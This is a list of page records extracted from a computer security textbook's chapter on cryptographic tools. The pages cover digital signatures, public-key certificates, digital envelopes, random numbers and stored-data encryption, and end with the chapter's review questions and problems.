       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 74, 'page_label': '73'}, page_content='2.4 / digiTal SignaTureS and Key managemenT  73\\nBob wants to send a message to Alice. Although it is not important that the message \\nbe kept secret, he wants Alice to be certain that the message is indeed from him. \\nFor this purpose, Bob uses a secure hash function, such as SHA-512, to generate a \\nhash value for the message. That hash value, together with Bob’s private key, serve \\nas input to a digital signature generation algorithm that produces a short block that \\nfunctions as a digital signature. Bob sends the message with the signature attached. \\nWhen Alice receives the message plus signature, she (1) calculates a hash value for \\nthe message; (2) provides the hash value and Bob’s public key as inputs to a digital \\nsignature verification algorithm. If the algorithm returns the result that the signature \\nis valid, Alice is assured that the message must have been signed by Bob. No one else \\nFigure 2.7 Simplified Depiction of Essential Elements of Digital Signature Process\\nBob Alice\\nCryptographic\\nhash\\nfunction\\nh\\nCryptographic\\nhash\\nfunction\\nhBob’s\\nprivate\\nkey\\nDigital\\nsignature\\ngeneration\\nalgorithm\\nBob’s\\nsignature\\nfor M\\n(a) Bob signs a message (b) Alice veriﬁes the signature\\nBob’s\\npublic\\nkey\\nDigital\\nsignature\\nveriﬁcation\\nalgorithm\\nReturn\\nsignature valid\\nor not valid\\nMessage M S Message M\\nS Message M\\nM02_STAL0611_04_GE_C02.indd   73 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 75, 'page_label': '74'}, page_content='74  ChaPTer 2 / CryPTograPhiC ToolS\\nhas Bob’s private key, and therefore no one else could have created a signature that \\ncould be verified for this message with Bob’s public key. In addition, it is impossible to \\nalter the message without access to Bob’s private key, so the message is authenticated \\nboth in terms of source and in terms of data integrity.\\nThe digital signature does not provide confidentiality. That is, the message being \\nsent is safe from alteration, but not safe from eavesdropping. This is obvious in the \\ncase of a signature based on a portion of the message, because the rest of the mes -\\nsage is transmitted in the clear. Even in the case of complete encryption, there is no \\nprotection of confidentiality because any observer can decrypt the message by using \\nthe sender’s public key.\\nPublic-Key Certificates\\nOn the face of it, the point of public-key encryption is that the public key is public. Thus, \\nif there is some broadly accepted public-key algorithm, such as RSA, any participant \\ncan send his or her public key to any other participant or broadcast the key to the com-\\nmunity at large. Although this approach is convenient, it has a major weakness. Anyone \\ncan forge such a public announcement. That is, some user could pretend to be Bob and \\nsend a public key to another participant or broadcast such a public key. Until such time \\nas Bob discovers the forgery and alerts other participants, the forger is able to read all \\nencrypted messages intended for Bob and can use the forged keys for authentication.\\nThe solution to this problem is the public-key certificate. In essence, a certifi -\\ncate consists of a public key plus a user ID of the key owner, with the whole block \\nsigned by a trusted third party. The certificate also includes some information about \\nthe third party plus an indication of the period of validity of the certificate. Typically, \\nthe third party is a certificate authority (CA) that is trusted by the user community, \\nsuch as a government agency or a financial institution. A user can present his or her \\npublic key to the authority in a secure manner and obtain a signed certificate. The \\nuser can then publish the certificate. Anyone needing this user’s public key can obtain \\nthe certificate and verify that it is valid by means of the attached trusted signature. \\nFigure 2.8 illustrates the process.\\nThe key steps can be summarized as follows:\\n1. User software (client) creates a pair of keys: one public and one private.\\n2. Client prepar es an unsigned certificate that includes the user ID and user’s \\npublic key.\\n3. User provides the unsigned certificate to a CA in some secure manner. This might \\nrequire a face-to-face meeting, the use of registered e-mail, or happen via a Web \\nform with e-mail verification.\\n4. CA creates a signature as follows:\\na. CA uses a hash function to calculate the hash code of the unsigned certifi -\\ncate. A hash function is one that maps a variable-length data block or mes-\\nsage into a fixed-length value called a hash code, such as SHA family that \\nwe will discuss in Sections 2.2 and 21.1.\\nb. CA generates digital signature using the CA’s private key and a signature \\ngeneration algorithm.\\n5. CA attaches the signature to the unsigned certificate to create a signed certificate.\\nM02_STAL0611_04_GE_C02.indd   74 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 76, 'page_label': '75'}, page_content='2.4 / digiTal SignaTureS and Key managemenT  75\\n6. CA returns the signed certificate to client.\\n7. Client may provide the signed certificate to any other user.\\n8. Any user may verify that the certificate is valid as follows:\\na. User calculates the hash code of certificate (not including signature).\\nb. User verifies digital signature using CA’s public key and the signature veri-\\nfication algorithm. The algorithm returns a result of either signature valid \\nor invalid.\\nOne scheme has become universally accepted for formatting public-key \\n certificates: the X.509 standard. X.509 certificates are used in most network security \\napplications, including IP Security (IPsec), Transport Layer Security (TLS), Secure \\nShell (SSH), and Secure/Multipurpose Internet Mail Extension (S/MIME). We will \\nexamine most of these applications in Part Five.\\nSymmetric Key Exchange Using Public-Key Encryption\\nWith symmetric encryption, a fundamental requirement for two parties to communi-\\ncate securely is that they share a secret key. Suppose Bob wants to create a messaging \\napplication that will enable him to exchange e-mail securely with anyone who has \\naccess to the Internet, or to some other network that the two of them share. Suppose \\nBob wants to do this using symmetric encryption. With symmetric encryption, Bob \\nand his correspondent, say, Alice, must come up with a way to share a unique secret \\nkey that no one else knows. How are they going to do that? If Alice is in the next \\nroom from Bob, Bob could generate a key and write it down on a piece of paper or \\nFigure 2.8 Public-Key Certificate Use\\nUnsigned certiﬁcate:\\ncontains user ID,\\nuser’s public key,\\nas well as information\\nconcerning the CA\\nSigned certiﬁcateGenerate hash\\ncode of unsigned\\ncertiﬁcate\\nGenerate hash code\\nof certiﬁcate not\\nincluding signature\\nGenerate digital signature\\nusing CA’s private key\\nH\\nH\\nBob’s ID\\ninformation\\nCA\\ninformation\\nBob’s public key\\nSG SV\\nVerify digital signature\\nusing CA’s public key\\nReturn signature\\nvalid or not valid\\nUse certiﬁcate to\\nverify Bob’s public key\\nCreate signed\\ndigital certiﬁcate\\nM02_STAL0611_04_GE_C02.indd   75 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 77, 'page_label': '76'}, page_content='76  ChaPTer 2 / CryPTograPhiC ToolS\\nstore it on a disk or thumb drive and hand it to Alice. But if Alice is on the other \\nside of the continent or the world, what can Bob do? He could encrypt this key using \\nsymmetric encryption and e-mail it to Alice, but this means that Bob and Alice must \\nshare a secret key to encrypt this new secret key. Furthermore, Bob and everyone \\nelse who uses this new e-mail package faces the same problem with every potential \\ncorrespondent: Each pair of correspondents must share a unique secret key.\\nOne approach is the use of Diffie–Hellman key exchange. This approach \\nis\\xa0indeed widely used. However, it suffers the drawback that, in its simplest form, \\n Diffie–Hellman provides no authentication of the two communicating partners. There \\nare variations to Diffie–Hellman that overcome this problem. In addition, there are \\nprotocols using other public-key algorithms that achieve the same objective.\\nDigital Envelopes\\nAnother application in which public-key encryption is used to protect a symmetric \\nkey is the digital envelope, which can be used to protect a message without needing \\nto first arrange for sender and receiver to have the same secret key. The technique \\nis referred to as a digital envelope, which is the equivalent of a sealed envelope con-\\ntaining an unsigned letter. The general approach is shown in Figure 2.9. Suppose Bob \\nFigure 2.9 Digital Envelopes\\nRandom\\nsymmetric\\nkey\\nReceiver’s\\npublic\\nkey\\nEncrypted\\nsymmetric\\nkey\\nEncrypted\\nmessage\\nEncrypted\\nmessage\\nDigital\\nenvelope\\n(a) Creation of a digital envelope\\nE\\nE\\nMessage\\nRandom\\nsymmetric\\nkey\\nReceiver’s\\nprivate\\nkey\\nEncrypted\\nsymmetric\\nkey\\n(b) Opening a digital envelope\\nD\\nD\\nDigital\\nenvelope\\nMessage\\nM02_STAL0611_04_GE_C02.indd   76 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 78, 'page_label': '77'}, page_content='2.5 / random and PSeudorandom numberS  77\\nwishes to send a confidential message to Alice, but they do not share a symmetric \\nsecret key. Bob does the following:\\n1. Prepare a message.\\n2. Generate a random symmetric key that will be used this one time only.\\n3. Encrypt that message using symmetric encryption the one-time key.\\n4. Encrypt the one-time key using public-key encryption with Alice’s public key.\\n5. Attach the encrypted one-time k ey to the encrypted message and send it to \\nAlice.\\nOnly Alice is capable of decrypting the one-time key and therefore of recov -\\nering the original message. If Bob obtained Alice’s public key by means of Alice’s \\npublic-key certificate, then Bob is assured that it is a valid key.\\n 2.5 RANDOM AND PSEUDORANDOM NUMBERS\\nRandom numbers play an important role in the use of encryption for various net -\\nwork security applications. We provide a brief overview in this section. The topic is \\nexamined in detail in Appendix D.\\nThe Use of Random Numbers\\nA number of network security algorithms based on cryptography make use of ran -\\ndom numbers. For example:\\n• Generation of k eys for the RSA public-key encryption algorithm (to be \\ndescribed in Chapter 21) and other public-key algorithms.\\n• Generation of a stream key for symmetric stream cipher.\\n• Generation of a symmetric key for use as a temporary session key or in creating \\na digital envelope.\\n• In a number of key distribution scenarios, such as Kerberos (to be described in  \\nChapter 23), random numbers are used for handshaking to prevent replay attacks.\\n• Session key generation, whether done by a key distribution center or by one \\nof the principals.\\nThese applications give rise to two distinct and not necessarily compatible \\nrequirements for a sequence of random numbers: randomness, and unpredictability.\\nranDoMnESS Traditionally, the concern in the generation of a sequence of alleg -\\nedly random numbers has been that the sequence of numbers be random in some \\nwell-defined statistical sense. The following two criteria are used to validate that a \\nsequence of numbers is random:\\n• Uniform distribution: The distribution of numbers in the sequence should be \\nuniform; that is, the frequency of occurrence of each of the numbers should be \\napproximately the same.\\n• Independence: No one value in the sequence can be inferred from the others.\\nM02_STAL0611_04_GE_C02.indd   77 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 79, 'page_label': '78'}, page_content='78  ChaPTer 2 / CryPTograPhiC ToolS\\nAlthough there are well-defined tests for determining that a sequence of num-\\nbers matches a particular distribution, such as the uniform distribution, there is no \\nsuch test to “prove” independence. Rather, a number of tests can be applied to dem-\\nonstrate if a sequence does not exhibit independence. The general strategy is to apply \\na number of such tests until the confidence that independence exists is sufficiently \\nstrong.\\nIn the context of our discussion, the use of a sequence of numbers that appear \\nstatistically random often occurs in the design of algorithms related to cryptography. \\nFor example, a fundamental requirement of the RSA public-key encryption scheme is \\nthe ability to generate prime numbers. In general, it is difficult to determine if a given \\nlarge number N is prime. A brute-force approach would be to divide N by every odd \\ninteger less than 1N. If N is on the order, say, of 10150, a not uncommon  occurrence in \\npublic-key cryptography, such a brute-force approach, is beyond the reach of human \\nanalysts and their computers. However, a number of effective algorithms exist that \\ntest the primality of a number by using a sequence of randomly  chosen integers\\xa0as \\ninput to relatively simple computations. If the sequence is sufficiently long (but far, far  \\nless than 210150 ), the primality of a number can be determined with near certainty. This \\ntype of approach, known as randomization, crops up frequently in the design of algo-\\nrithms. In essence, if a problem is too hard or time-consuming to solve exactly, a \\nsimpler, shorter approach based on randomization is used to provide an answer with \\nany desired level of confidence.\\nunprEDictability In applications such as reciprocal authentication and session \\nkey generation, the requirement is not so much that the sequence of numbers be \\nstatistically random, but that the successive members of the sequence are unpre -\\ndictable. With “true” random sequences, each number is statistically independent of \\nother numbers in the sequence and therefore unpredictable. However, as discussed \\nshortly, true random numbers are not always used; rather, sequences of numbers that \\nappear to be random are generated by some algorithm. In this latter case, care must \\nbe taken that an opponent is not be able to predict future elements of the sequence \\non the basis of earlier elements.\\nRandom versus Pseudorandom\\nCryptographic applications typically make use of algorithmic techniques for ran -\\ndom number generation. These algorithms are deterministic and therefore produce \\nsequences of numbers that are not statistically random. However, if the algorithm is \\ngood, the resulting sequences will pass many reasonable tests of randomness. Such \\nnumbers are referred to as pseudorandom numbers.\\nYou may be somewhat uneasy about the concept of using numbers generated \\nby a deterministic algorithm as if they were random numbers. Despite what might \\nbe called philosophical objections to such a practice, it generally works. That is, \\nunder most circumstances, pseudorandom numbers will perform as well as if they \\nwere random for a given use. The phrase “as well as” is unfortunately subjective, but \\nthe use of pseudorandom numbers is widely accepted. The same principle applies \\nin statistical applications, in which a statistician takes a sample of a population and \\nassumes the results will be approximately the same as if the whole population were \\nmeasured.\\nM02_STAL0611_04_GE_C02.indd   78 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 80, 'page_label': '79'}, page_content='2.6 / PraCTiCal aPPliCaTion: enCryPTion of STored daTa  79\\nA true random number generator (TRNG) uses a nondeterministic source to \\nproduce randomness. Most operate by measuring unpredictable natural processes, \\nsuch as pulse detectors of ionizing radiation events, gas discharge tubes, and leaky \\ncapacitors. Intel has developed a commercially available chip that samples ther -\\nmal noise by amplifying the voltage measured across undriven resistors [JUN99]. \\nLavaRnd is an open source project for creating truly random numbers using inex -\\npensive cameras, open source code, and inexpensive hardware. The system uses a \\nsaturated charge-coupled device (CCD) in a light-tight can as a chaotic source to \\nproduce the seed. Software processes the result into truly random numbers in a vari-\\nety of formats. The first commercially available TRNG that achieves bit production \\nrates comparable with that of PRNGs is the Intel digital random number generator \\n(DRNG) [TA YL11], offered on new multicore chips since May 2012.\\n 2.6  PRACTICAL APPLICATION: ENCRYPTION \\nOF STORED DATA\\nOne of the principal security requirements of a computer system is the protection of \\nstored data. Security mechanisms to provide such protection include access control, \\nintrusion detection, and intrusion prevention schemes, all of which are discussed in \\nthis book. The book also describes a number of technical means by which these vari-\\nous security mechanisms can be made vulnerable. But beyond technical approaches, \\nthese approaches can become vulnerable because of human factors. We list a few \\nexamples here, based on [ROTH05]:\\n• In December of 2004, Bank of America employees backed up then sent to its \\nbackup data center tapes containing the names, addresses, bank account num-\\nbers, and Social Security numbers of 1.2 million government workers enrolled \\nin a charge-card account. None of the data were encrypted. The tapes never \\narrived, and indeed have never been found. Sadly, this method of backing up \\nand shipping data is all too common. As an another example, in April of 2005, \\nAmeritrade blamed its shipping vendor for losing a backup tape containing \\nunencrypted information on 200,000 clients.\\n• In April of 2005, San Jose Medical group announced that someone had physi-\\ncally stolen one of its computers and potentially gained access to 185,000 unen-\\ncrypted patient records.\\n• There have been countless examples of laptops lost at airports, stolen from a \\nparked car, or taken while the user is away from his or her desk. If the data on \\nthe laptop’s hard drive are unencrypted, all of the data are available to the thief.\\nAlthough it is now routine for businesses to provide a variety of protections, \\nincluding encryption, for information that is transmitted across networks, via the \\nInternet, or via wireless devices, once data are stored locally (referred to as data at \\nrest), there is often little protection beyond domain authentication and operating \\nsystem access controls. Data at rest are often routinely backed up to secondary stor-\\nage such as optical media, tape or removable disk, archived for indefinite periods. \\nFurther, even when data are erased from a hard disk, until the relevant disk sectors \\nM02_STAL0611_04_GE_C02.indd   79 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 81, 'page_label': '80'}, page_content='80  ChaPTer 2 / CryPTograPhiC ToolS\\nare reused, the data are recoverable. Thus, it becomes attractive, and indeed should \\nbe mandatory, to encrypt data at rest and combine this with an effective encryption \\nkey management scheme.\\nThere are a variety of ways to provide encryption services. A simple approach \\navailable for use on a laptop is to use a commercially available encryption package \\nsuch as Pretty Good Privacy (PGP). PGP enables a user to generate a key from a \\npassword and then use that key to encrypt selected files on the hard disk. The PGP \\npackage does not store the password. To recover a file, the user enters the password, \\nPGP generates the key, and then decrypts the file. So long as the user protects his \\nor her password and does not use an easily guessable password, the files are fully \\n protected while at rest. Some more recent approaches are listed in [COLL06]:\\n• Back-end appliance: This is a hardware device that sits between servers and stor-\\nage systems and encrypts all data going from the server to the storage system, and \\ndecrypts data going in the opposite direction. These devices encrypt data at close \\nto wire speed, with very little latency. In contrast, encryption software on servers \\nand storage systems slows backups. A system manager configures the appliance \\nto accept requests from specified clients, for which unencrypted data are supplied.\\n• Library-based tape encryption:  This is provided by means of a co-processor \\nboard embedded in the tape drive and tape library hardware. The co-processor \\nencrypts data using a nonreadable key configured into the board. The tapes \\ncan then be sent off-site to a facility that has the same tape drive hardware. The \\nkey can be exported via secure e-mail, or a small flash drive that is transported \\nsecurely. If the matching tape drive hardware co-processor is not available at \\nthe other site, the target facility can use the key in a software decryption pack-\\nage to recover the data.\\n• Background laptop and PC data encryption:  A number of vendors offer soft -\\nware products that provide encryption that is transparent to the application \\nand the user. Some products encrypt all or designated files and folders. Other \\nproducts, such as Windows BitLocker and MacOS FileVault, encrypt an entire \\ndisk or disk image located on either the user’s hard drive or maintained on a \\nnetwork storage device, with all data on the virtual disk encrypted. Various key \\nmanagement solutions are offered to restrict access to the owner of the data.\\n 2.7 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nAdvanced Encryption \\n Standard (AES)\\nasymmetric encryption\\nauthentication\\nbrute-force attack\\nciphertext\\ncollision resistant\\nconfidentiality\\ncryptanalysis\\nData Encryption Standard \\n(DES)\\ndata integrity\\nDecryption\\nDiffie–Hellman key exchange\\ndigital signature\\nDigital Signature Standard \\n(DSS)\\nelliptic curve cryptography\\nM02_STAL0611_04_GE_C02.indd   80 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 82, 'page_label': '81'}, page_content='2.7 / Key TermS, reView QueSTionS, and ProblemS  81\\nReview Questions\\n 2.1 How is cryptanalysis different from brute-force attack?\\n 2.2 List and briefly explain the different approaches to attacking a symmetric encryption \\nscheme.\\n 2.3 What are the two principal requirements for the secure use of symmetric encryption?\\n 2.4 List the two important aspects of data authentication.\\n 2.5 What is one-way hash function?\\n 2.6 Briefly describe the three schemes illustrated in Figure 2.3.\\n 2.7 What properties must a hash function have to be useful for message authentication?\\n 2.8 What are the principal ingredients of a public-key cryptosystem?\\n 2.9 List and briefly define three uses of a public-key cryptosystem.\\n 2.10 What advantage might elliptic curve cryptography (ECC) have over RSA?\\n 2.11 Do digital signatures provide confidentiality?\\n 2.12 What is a public-key certificate?\\n 2.13 What are three different ways in which random numbers are used in cryptography?\\nProblems\\n 2.1 Typically, in practice, the length of the message is greater than the block size of the \\nencryption algorithm. The simplest approach to handle such encryption is known as \\nelectronic codebook (ECB) mode. Explain this mode. Mention a scenario where it \\ncannot be applied. Explain briefly why it is not a secure mode of encryption.\\n 2.2 This pr oblem uses a real-world example of a symmetric cipher, from an old U.S. \\n Special Forces manual (public domain). The document, filename Special Forces.pdf, is \\navailable at box.com/CompSec4e.\\na. Using the two keys (memory wor ds) cryptographic and network security, encrypt \\nthe following message:\\nBe at the third pillar from the left outside the lyceum theatre tonight at \\nseven. If you are distrustful bring two friends.\\nMake reasonable assumptions about how to treat redundant letters and excess let-\\nters in the memory words and how to treat spaces and punctuation. Indicate what \\nyour assumptions are.\\nNote: The message is from the Sherlock Holmes novel The Sign of Four.\\nb. Decrypt the ciphertext. Show your work.\\nc. Comment on when it would be appropriate to use this technique and what its \\nadvantages are.\\nencryption\\nhash function\\nkeystream\\nmessage authentication\\nmessage authentication  \\ncode (MAC)\\nmodes of operation\\none-way hash function\\nplaintext\\npreimage resistant\\nprivate key\\npseudorandom number\\npublic key\\npublic-key certificate\\npublic-key encryption\\nrandom number\\nRSA\\nsecond preimage resistant\\nsecret key\\nsecure hash algorithm (SHA)\\nsecure hash function\\nstrong collision resistant\\nsymmetric encryption\\ntriple DES\\nweak collision resistant\\nM02_STAL0611_04_GE_C02.indd   81 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 83, 'page_label': '82'}, page_content='82  ChaPTer 2 / CryPTograPhiC ToolS\\n 2.3 Consider a very simple symmetric block encryption algorithm, in which 64-bits blocks \\nof plaintext are encrypted using a 128-bit key. Encryption is defined as\\nC = (P /uni2295.altK0) Ä K1\\nwhere C = ciphertext; K = secret key; K0 = leftmost 64 bits of K; K1 = rightmost \\n64 bits of K, /uni2295.alt= bitwise exclusive or; and Ä is addition mod 264.\\na. Show the decryption equation. That is, show the equation for P as a function of C, \\nK1 and K2.\\nb. Suppose an adversary has access to two sets of plaintexts and their corresponding \\nciphertexts and wishes to determine K. We have the two equations:\\nC = (P /uni2295.altK0) Ä K1; C/uni2032= (P/uni2032 /uni2295.altK0) Ä K1\\nFirst, derive an equation in one unknown (e.g., K0). Is it possible to proceed further \\nto solve for K0?\\n 2.4 Perhaps the simplest “serious” symmetric block encryption algorithm is the Tiny \\nEncryption Algorithm (TEA). TEA operates on 64-bit blocks of plaintext using a \\n 128-bit key. The plaintext is divided into two 32-bit blocks (L0, R0), and the key is \\ndivided into four 32-bit blocks (K0, K1, K2, K3). Encryption involves repeated applica-\\ntion of a pair of rounds, defined as follows for rounds i and i + 1:\\n Li = Ri - 1\\n Ri = Li - 1 Ä F(Ri - 1, K0, K1, di)\\n Li + 1 = Ri\\n Ri + 1 = Li Ä F(Ri, K2, K3, di + 1)\\nwhere F is defined as\\nF(M, Kj, Kk, di) = ((M V 4) Ä Kj) /uni2295.alt((M W 5) Ä Kk) /uni2295.alt(M + di)\\nand where the logical shift of x by y bits is denoted by x V y; the logical right shift x \\nby y bits is denoted by x W y; and di is a sequence of predetermined constants.\\na. Comment on the significance and benefit of using the sequence of constants.\\nb. Illustrate the oper ation of TEA using a block diagram or flow chart type of \\ndepiction.\\nc. If only one pair of rounds is used,  then the ciphertext consists of the 64-bit block \\n(L2, R2). For this case, express the decryption algorithm in terms of equations.\\nd. Repeat part (c) using an illustration similar to that used for part (b).\\n 2.5 In this problem,  we will compare the security services that are provided by digital \\n signatures (DS) and message authentication codes (MA C). We assume Oscar is able \\nto observe all messages sent from Alice to Bob and vice versa. Oscar has no knowl -\\nedge of any keys but the public one in case of DS. State whether and how (i) DS and \\n(ii) MAC protect against each attack. The value auth(x) is computed with a DS or a \\nMAC algorithm, respectively.\\na. (Message integrity) Alice sends a message x = ;Transfer $1000 to Mark< in the \\nclear and also sends auth(x) to Bob. Oscar intercepts the message and replaces \\n“Mark” with “Oscar.” Will Bob detect this?\\nb. (Replay) Alice sends a message x = ;Transfer $1000 to Oscar< in the clear and \\nalso sends auth(x) to Bob. Oscar observes the message and signature and sends \\nthem 100 times to Bob. Will Bob detect this?\\nc. (Sender authentication with cheating third party) Oscar claims that he sent some \\nmessage x with a v alid auth(x) to Bob but Alice claims the same. Can Bob clear \\nthe question in either case?\\nd. (Authentication with Bob cheating) Bob claims that he received a message x \\nwith a valid signature auth(x) from Alice (e.g., “Transfer $1000 from Alice to \\nBob”) but Alice claims she has never sent it. Can Alice clear this question in \\neither case?\\nM02_STAL0611_04_GE_C02.indd   82 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 84, 'page_label': '83'}, page_content=\"2.7 / Key TermS, reView QueSTionS, and ProblemS  83\\n 2.6 Suppose H(M) is a cryptographic hash function that maps a message of an arbitrary bit \\nlength on to an n-bit hash value. Briefly explain the primary security requirements of the \\nhash function H. Assume that H outputs 16-bit hash values. How many random messages \\nwould be required to find two different messages M and M' such that H(M) = H(M/uni2032).\\n 2.7 This problem introduces a hash function similar in spirit to SHA that operates on let-\\nters instead of binary data. It is called the toy tetragraph hash (tth).8 Given a message \\nconsisting of a sequence of letters, tth produces a hash value consisting of four letters. \\nFirst, tth divides the message into blocks of 16 letters, ignoring spaces, punctuation, \\nand capitalization. If the message length is not divisible by 16, it is padded out with \\nnulls. A four-number running total is maintained that starts out with the value (0, 0, 0, \\n0); this is input to a function, known as a compression function, for processing the first \\nblock. The compression function consists of two rounds. Round 1: Get the next block \\nof text and arrange it as a row-wise 4 * 4 block of text and convert it to numbers \\n(A = 0, B = 1), for example, for the block ABCDEFGHIJKLMNOP , we have\\nA B C D\\nE F G H\\nI J K L\\nM N O P\\n0 1 2 3\\n4 5 6 7\\n8 9 10 11\\n12 13 14 15\\nThen, add each column mod 26 and add the result to the running total, mod 26. In this \\nexample, the running total is (24, 2, 6, 10). Round 2: Using the matrix from round 1, \\nrotate the first row left by 1, second row left by 2, third row left by 3, and reverse the \\norder of the fourth row. In our example,\\nB C D A\\nG H E F\\nL I J K\\nP O N M\\n1 2 3 0\\n6 7 4 5\\n11 8 9 10\\n15 14 13 12\\nNow, add each column mod 26 and add the result to the running total. The new run -\\nning total is (5, 7 , 9, 11). This running total is now the input into the first round of the \\ncompression function for the next block of text. After the final block is processed, \\nconvert the final running total to letters. For example, if the message is ABCDEF -\\nGHIJKLMNOP , then the hash is FHJL.\\na. Draw figures of the overall tth logic and the compression function logic.\\nb. Calculate the hash function for the 48-letter message “I leave twenty million \\n dollars to my friendly cousin Bill.”\\nc. To demonstrate the weakness of tth, find a 48-letter block that produces the same \\nhash as that just derived. Hint: Use lots of As.\\n 2.8 Prior to the discovery of any specific public-key schemes , such as RSA, an existence \\nproof was developed whose purpose was to demonstrate that public-key encryption \\nis possible in theory. Consider the functions f1(x1) = z1; f2(x2, y2) = z2; f3(x3, y3) = z3, \\nwhere all values are integers with 1 … xi, yi, zi … N. Function f1 can be represented \\nby a vector M1 of length N, in which the kth entry is the value of f1(k). Similarly,  \\n8I thank William K. Mason and The American Cryptogram Association for providing this example.\\nM02_STAL0611_04_GE_C02.indd   83 10/11/17   2:42 PM\"),\n",
